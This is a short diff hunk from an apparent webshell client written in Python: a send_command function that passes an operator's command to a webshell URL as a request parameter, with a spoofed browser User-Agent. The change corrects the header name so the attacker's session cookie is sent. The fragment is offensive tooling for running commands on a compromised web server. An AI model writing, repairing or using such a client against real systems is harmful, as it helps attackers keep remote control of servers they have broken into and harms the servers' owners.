@@ -7,7 +7,7 @@ import base64
 from termcolor import colored
 
 def send_command(command, webshell, method, cookies, param="code"):
-   headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0", "Cookies":args.cookies}
+   headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0", "Cookie":args.cookies}
    params = {param.strip():command.strip()}
    if (method.upper() == "GET"):
       response = requests.get((webshell), params=params, headers=headers)
